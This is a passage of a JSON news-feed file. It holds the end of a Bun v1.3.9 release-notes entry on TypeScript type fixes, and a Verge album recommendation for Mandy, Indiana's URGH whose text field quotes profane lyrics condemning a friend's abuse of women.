, causing type errors when cross-compiling with specific architecture targets. Fixed: Missing bun-linux-x64-baseline and bun-linux-x64-modern compile target types in TypeScript definitions, which caused type errors when using Bun.build() with these valid targets. Fixed: Socket.reload() TypeScript types now correctly expect { socket: handler } to match runtime behavior, which requires the handler to be wrapped in a socket property.",
      "cover_image_url": "https://bun.com/og/blog/bun-v1.3.9.png"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "You need to listen to the new Mandy, Indiana record: URGH",
      "url": "https://www.theverge.com/entertainment/875469/mandy-indiana-urgh-review",
      "published": "2026-02-08T17:30:00+00:00",
      "summary": "Often, I focus on recommending older media that isn't currently getting a ton of attention. But this week, I can't stop listening to the new Mandy, Indiana album long enough to even think about anything else. It's early still, obviously, but URGH is my favorite release of 2026 so far. The band that I fell [&#8230;]",
      "content_text": "Women cover their drinks around him, but they‚Äôre all fucking crazy, man And his ex went to the police, but they‚Äôre all fucking crazy, man He brags about getting them drunk, but they‚Äôre all fucking crazy, man Yeah, your friend‚Äôs a fucking rapist, but they‚Äôre all fucking crazy, man",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/urgh.png?quality=90&strip=all&crop=0%2C13.100734581576%2C100%2C71.989528795812&w=1200"
    }
  ]
}